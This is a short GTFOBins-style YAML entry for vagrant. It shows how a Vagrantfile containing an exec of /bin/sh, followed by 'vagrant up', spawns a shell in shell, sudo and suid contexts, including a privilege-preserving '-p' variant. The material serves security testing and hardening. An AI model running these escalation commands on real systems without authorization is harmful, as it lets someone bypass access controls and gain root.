---
description: This allows to execute [`ruby`](/gtfobins/ruby/) code, other functions may apply.
functions:
  shell:
    - code: |
        cd $(mktemp -d)
        echo 'exec "/bin/sh"' > Vagrantfile
        vagrant up
  sudo:
    - code: |
        cd $(mktemp -d)
        echo 'exec "/bin/sh"' > Vagrantfile
        vagrant up
  suid:
    - code: |
        cd $(mktemp -d)
        echo 'exec "/bin/sh -p"' > Vagrantfile
        vagrant up
---
